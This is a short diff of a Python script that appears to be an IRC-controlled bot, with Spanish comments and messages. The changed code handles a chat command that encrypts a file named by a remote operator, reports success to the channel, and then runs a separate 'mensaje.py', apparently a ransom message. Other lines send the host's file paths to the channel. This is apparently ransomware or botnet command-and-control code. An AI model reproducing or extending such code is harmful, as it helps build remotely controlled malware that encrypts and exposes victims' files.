@@ -151,11 +151,14 @@ while 1:
         FilesWithPath = files(user[:-2])
         for file in FilesWithPath:
             irc.send("PRIVMSG "+channel+" %s\r\n" %file)
-    if msg.find("!@CIFRA") != -1:
-        irc.send("PRIVMSG "+channel+" :CIFRANDO!\r\n")
+    if msg.find("!@cifraArchivo") != -1:
+        irc.send("PRIVMSG "+channel+" :Cifrando...\r\n")
         msg2=msg.split(' ')
-        try:
-            Cifra(msg2[4].replace('\r\n',''))
+	try:
+	    Cifra(msg2[4].replace('\r\n',''))
+	    irc.send("PRIVMSG "+channel+" :El archivo fue cifrado correctamente ;)\r\n")
+	    proc = subprocess.Popen([sys.executable, "mensaje.py"])
+            proc.communicate()
         except Exception as e:
             irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
     # Limpio el msg
